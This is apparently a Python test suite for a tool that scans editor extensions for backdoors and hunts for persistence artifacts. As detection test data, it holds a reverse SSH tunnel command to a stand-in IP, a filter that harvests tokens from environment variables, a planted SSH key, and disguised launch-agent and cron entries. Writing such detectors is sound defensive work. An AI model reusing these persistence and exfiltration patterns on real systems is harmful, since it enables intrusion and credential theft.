import hashlib
import io
import json
import os
import plistlib
import shutil
import tempfile
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timedelta, timezone
from unittest import mock

from extwatch import cli, hunt, official
from extwatch.analyze import injected_prefix, scan_text
from extwatch.checks import HIGH, check_extension
from extwatch.data import known_bad
from extwatch.discover import installed, open_folder, open_vsix
from tests.fixtures import (ESBUILD_BODY, INJECTED, MANIFEST, backdoored_files, clean_files, make_vsix,
                            write_folder)

BACKDOOR_RULES = {"EW001", "EW002", "EW003", "EW006", "EW007", "EW010", "EW011"}


def rules(findings, min_sev=None):
    order = {"low": 0, "medium": 1, "high": 2}
    return {f.rule for f in findings if min_sev is None or order[f.severity] >= order[min_sev]}


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def vsix(self, files, name="x.vsix"):
        path = os.path.join(self.tmp, name)
        with open(path, "wb") as fh:
            fh.write(make_vsix(files))
        return open_vsix(path)


class AnalyzeTests(unittest.TestCase):
    def test_injected_prefix(self):
        self.assertIsNotNone(injected_prefix(INJECTED + ESBUILD_BODY))
        self.assertIsNone(injected_prefix(ESBUILD_BODY))
        # webpack bundle that happens to contain a nested esbuild bundle later on
        webpack = '(()=>{var e={4666(e,t){"use strict";require("fs")},' + "x" * 5000 + ESBUILD_BODY
        self.assertIsNone(injected_prefix(webpack))
        self.assertIsNone(injected_prefix('require("child_process").exec("ls")'))  # no bundle at all

    def test_env_harvest_needs_uppercase_filter(self):
        self.assertIn("env_harvest", scan_text(
            'Object.keys(process.env).filter(function(k){return /KEY|TOKEN/i.test(k)})'))
        self.assertNotIn("env_harvest", scan_text(
            "Object.keys(process.env).forEach(key => result[key] = process.env[key])"))

    def test_ip_needs_network_context(self):
        self.assertIn("public_ip_ip", scan_text('fetch("http://45.33.12.9/x")'))
        self.assertIn("public_ip_ip", scan_text('http.request({host:"45.33.12.9",port:80})'))
        self.assertNotIn("public_ip_ip", scan_text('reg("1.3.101.112","EdDSA25519")'))  # certificate OID
        self.assertNotIn("public_ip_ip", scan_text("// Eg, '1.2.3.4' wants to coerce '2.3.4'"))
        self.assertNotIn("public_ip_ip", scan_text('version: "4.12.20.1"'))

    def test_tunnel_spec_in_variable(self):
        self.assertIn("reverse_tunnel", scan_text("""var RF="'*:0:localhost:22'";"""))


class CheckTests(Base):
    def test_backdoor_caught(self):
        found = check_extension(self.vsix(backdoored_files()))
        self.assertTrue(BACKDOOR_RULES <= rules(found), rules(found))
        self.assertTrue({"EW001", "EW002", "EW003", "EW007"} <= rules(found, HIGH))

    def test_clean_is_quiet(self):
        self.assertEqual(check_extension(self.vsix(clean_files())), [])

    def test_known_bad_version_only_in_cursor(self):
        m = dict(MANIFEST, publisher="Anthropic", name="claude-code", version="2.1.313")
        root = os.path.join(self.tmp, "anthropic.claude-code-2.1.313")
        write_folder(root, clean_files(m))
        self.assertIn("EW015", rules(check_extension(open_folder(root, "Cursor"))))
        self.assertNotIn("EW015", rules(check_extension(open_folder(root, "VS Code"))))

    def test_known_bad_file_hash(self):
        files = backdoored_files()
        digest = hashlib.sha256(files["dist/extension.js"]).hexdigest()
        data = json.loads(json.dumps(known_bad()))
        data["file_sha256"][digest] = {"name": "test sample", "source": "test"}
        with mock.patch("extwatch.checks.known_bad", return_value=data):
            self.assertIn("EW015", rules(check_extension(self.vsix(files))))

    def test_impersonation(self):
        m = dict(MANIFEST, publisher="prettier-dev", name="prettier-pro", displayName="Prettier - Code formatter")
        self.assertIn("EW016", rules(check_extension(self.vsix(clean_files(m))), HIGH))
        m = dict(MANIFEST, publisher="esbenp", name="prettier-vscod")
        self.assertIn("EW016", rules(check_extension(self.vsix(clean_files(m)))))
        m = dict(MANIFEST, publisher="esbenp", name="prettier-vscode", displayName="Prettier - Code formatter")
        self.assertNotIn("EW016", rules(check_extension(self.vsix(clean_files(m)))))


class OfficialTests(Base):
    def test_compare(self):
        ref = clean_files()
        self.assertTrue(official.compare_files(dict(ref), ref, "X").identical)
        c = official.compare_files(backdoored_files(), ref, "X")
        self.assertEqual(c.modified, ["dist/extension.js"])
        extra = dict(ref, **{"dist/helper.js": b"x", "cache.bin": b"y"})
        c = official.compare_files(extra, ref, "X")
        self.assertEqual((c.added_code, c.added_other), (["dist/helper.js"], 1))

    def test_install_metadata_in_manifest_is_ignored(self):
        ref = clean_files()
        mine = dict(ref)
        mine["package.json"] = json.dumps(dict(MANIFEST, __metadata={"id": "x", "installedTimestamp": 1})).encode()
        self.assertTrue(official.compare_files(mine, ref, "X").identical)

    def _fake_http(self, official_files, verified=True):
        vsix = make_vsix(official_files)
        query = {"results": [{"extensions": [{
            "extensionName": "demo-ext", "publisher": {"publisherName": "demo", "isDomainVerified": verified},
            "versions": [{"version": "1.0.0", "files": [{
                "assetType": "Microsoft.VisualStudio.Services.VSIXPackage",
                "source": "https://demo.gallerycdn.vsassets.io/x/Microsoft.VisualStudio.Services.VSIXPackage"}]}]}]}]}

        def http(url, data=None, headers=None, timeout=30):
            if url == official.VSM_QUERY:
                return json.dumps(query).encode()
            if "gallerycdn" in url:
                return vsix
            return b""  # Open VSX: not found
        return http

    def test_verify_flags_tampered_copy(self):
        with mock.patch.object(official, "_http", self._fake_http(clean_files())), \
                mock.patch.object(official, "_cache_dir", return_value=self.tmp):
            ext = self.vsix(backdoored_files())
            v = official.verify(ext)
        self.assertEqual(v.found_on, ["VS Marketplace"])
        found = check_extension(ext, v)
        self.assertIn("EW012", rules(found, HIGH))

    def test_verified_match_hides_weak_signals(self):
        files = clean_files()
        files["dist/extension.js"] += b'\nvar x=Object.keys(process.env).filter(k=>/TOKEN/.test(k));'
        with mock.patch.object(official, "_http", self._fake_http(files)), \
                mock.patch.object(official, "_cache_dir", return_value=self.tmp):
            ext = self.vsix(files)
            v = official.verify(ext)
        self.assertIsNotNone(v.matched)
        self.assertNotIn("EW010", rules(check_extension(ext, v)))
        self.assertIn("EW010", rules(check_extension(ext)))  # still reported without --verify

    def test_pulled_version(self):
        def http(url, data=None, headers=None, timeout=30):
            if url == official.VSM_QUERY:
                return json.dumps({"results": [{"extensions": [{
                    "publisher": {"isDomainVerified": True},
                    "versions": [{"version": "9.9.9", "files": []}]}]}]}).encode()
            return b""
        with mock.patch.object(official, "_http", http):
            ext = self.vsix(clean_files())
            self.assertIn("EW013", rules(check_extension(ext, official.verify(ext))))


class DiscoverTests(Base):
    def test_installed_across_editors(self):
        home = self.tmp
        d = os.path.join(home, ".cursor", "extensions")
        write_folder(os.path.join(d, "demo.demo-ext-1.0.0-darwin-arm64"), clean_files())
        write_folder(os.path.join(d, "demo.old-1.0.0"), clean_files(dict(MANIFEST, name="old")))
        ts = int((datetime.now(timezone.utc) - timedelta(days=2)).timestamp() * 1000)
        with open(os.path.join(d, "extensions.json"), "w") as fh:
            json.dump([{"identifier": {"id": "demo.demo-ext"}, "version": "1.0.0",
                        "relativeLocation": "demo.demo-ext-1.0.0-darwin-arm64",
                        "metadata": {"source": "vsix", "installedTimestamp": ts}}], fh)
        with open(os.path.join(d, ".obsolete"), "w") as fh:
            json.dump({"demo.old-1.0.0": True}, fh)
        exts = list(installed(home=home))
        self.assertEqual([(e.id, e.editor, e.platform, e.source) for e in exts],
                         [("demo.demo-ext", "Cursor", "darwin-arm64", "vsix")])
        self.assertEqual((datetime.now(timezone.utc) - exts[0].installed).days, 2)


class HuntTests(Base):
    def test_authorized_keys(self):
        p = os.path.join(self.tmp, "authorized_keys")
        with open(p, "w") as fh:
            fh.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7oNbd5ljlKrbBjK0uIfXhDl5x5ApvwD5Ie2fVhjOuM svc-telemetry\n")
        self.assertEqual([f.rule for f in hunt.check_authorized_keys(p)], ["EW020"])

    def test_fingerprint_format(self):
        fp = hunt.ssh_fingerprint("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7oNbd5ljlKrbBjK0uIfXhDl5x5ApvwD5Ie2fVhjOuM x")
        self.assertTrue(fp.startswith("SHA256:") and not fp.endswith("="))

    def test_launch_agents(self):
        for name, label, args in [("com.apple.sysmond.plist", "com.apple.sysmond", ["/bin/sh", "/Users/a/.config/.smt"]),
                                  ("io.helper.plist", "io.helper", ["/bin/sh", "/Users/a/.cache/.run.sh"]),
                                  ("com.docker.helper.plist", "com.docker.helper", ["/usr/local/bin/docker"])]:
            with open(os.path.join(self.tmp, name), "wb") as fh:
                plistlib.dump({"Label": label, "ProgramArguments": args}, fh)
        self.assertEqual(sorted(f.rule for f in hunt.check_launch_agents(self.tmp)), ["EW023", "EW024"])

    def test_crontab_and_tunnels(self):
        cron = "# m h\n0 * * * * /usr/bin/backup\n@reboot /bin/sh /home/a/.config/.smt\n"
        self.assertEqual([f.rule for f in hunt.check_crontab(cron)], ["EW025"])
        ps = ("123 ssh -N -o StrictHostKeyChecking=no -R '*:0:localhost:22' tunnel@203.0.113.9\n"
              "456 ssh -L 8080:localhost:80 me@box\n")
        self.assertEqual([f.rule for f in hunt.check_tunnels(ps)], ["EW027"])

    def test_known_artifacts(self):
        os.makedirs(os.path.join(self.tmp, ".config"))
        open(os.path.join(self.tmp, ".config", ".smt"), "w").close()
        with mock.patch.dict(os.environ, {"HOME": self.tmp, "USERPROFILE": self.tmp, "TMPDIR": self.tmp}):
            self.assertIn("EW022", [f.rule for f in hunt.check_known_artifacts()])


class CliTests(Base):
    def run_cli(self, *argv):
        buf = io.StringIO()
        with redirect_stdout(buf):
            code = cli.main(list(argv))
        return code, buf.getvalue()

    def test_vsix_and_formats(self):
        bad = os.path.join(self.tmp, "bad.vsix")
        good = os.path.join(self.tmp, "good.vsix")
        with open(bad, "wb") as fh:
            fh.write(make_vsix(backdoored_files()))
        with open(good, "wb") as fh:
            fh.write(make_vsix(clean_files()))
        self.assertEqual(self.run_cli(good, "--no-color")[0], 0)
        code, out = self.run_cli(bad, "--no-color")
        self.assertEqual(code, 1)
        self.assertIn("Plants SSH keys", out)
        code, out = self.run_cli(bad, "--format", "sarif")
        self.assertTrue(BACKDOOR_RULES <= {r["ruleId"] for r in json.loads(out)["runs"][0]["results"]})
        code, out = self.run_cli(bad, "--format", "github", "--fail-on", "never")
        self.assertEqual(code, 0)
        self.assertTrue(out.startswith("::error title=EW"))

    def test_bad_path(self):
        self.assertEqual(cli.main([os.path.join(self.tmp, "nope.txt")]), 2)


if __name__ == "__main__":
    unittest.main()
